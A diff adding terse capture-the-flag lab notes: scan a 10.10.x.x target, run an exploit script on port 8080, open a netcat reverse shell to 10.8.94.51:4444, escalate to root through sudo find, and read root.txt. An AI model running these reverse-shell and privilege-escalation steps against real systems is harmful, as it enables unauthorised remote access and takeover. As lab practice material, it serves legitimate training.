@@ -1,0 +1,12 @@
+1 - nmap -A 10.10.115.170
+2 - wget https://i.imgur.com/be2sOV9.jpg
+3 - strings be2sOV9.jpg
+4 - python3 exploit.py 10.10.115.170:8080 "which nc"
+5 - python3 exploit.py 10.10.115.170:8080 "nc 10.8.94.51 4444 -e /bin/bash"
+6 - cat note
+7 - su jboss
+8 - sudo -l (find)
+9 - sudo find . -exec /bin/bash \; -quit
+10 - cat /root/root.txt
+11 - crackstation -> hash
+
